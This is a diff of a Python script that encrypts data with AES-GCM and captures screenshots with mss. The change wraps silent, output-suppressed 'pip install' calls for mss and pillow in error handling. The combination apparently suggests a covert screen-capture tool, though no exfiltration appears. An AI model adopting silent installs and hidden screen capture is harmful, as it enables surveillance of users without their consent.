@@ -8,17 +8,25 @@ from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.backends import default_backend
 import os, subprocess
 
+mss = None
 try:
     import mss
 except ImportError:
-    subprocess.run(["pip", "install", "mss"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-    import mss
+    try:
+        subprocess.run(["pip", "install", "mss"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        import mss
+    except:
+        pass
 
+Image = None
 try:
     from PIL import Image
 except ImportError:
-    subprocess.run(["pip", "install", "pillow"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-    from PIL import Image
+    try:
+        subprocess.run(["pip", "install", "pillow"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        from PIL import Image
+    except:
+        pass
 
 def aes_encrypt(data, key):
     aesgcm = AESGCM(key)
@@ -33,7 +41,7 @@ def aes_decrypt(encrypted_data, key):
     return aesgcm.decrypt(nonce, ciphertext, None)
 
 def capture_screenshots():
-    if mss is None:
+    if mss is None or Image is None:
         return []
     screenshots = []
     with mss.mss() as sct:
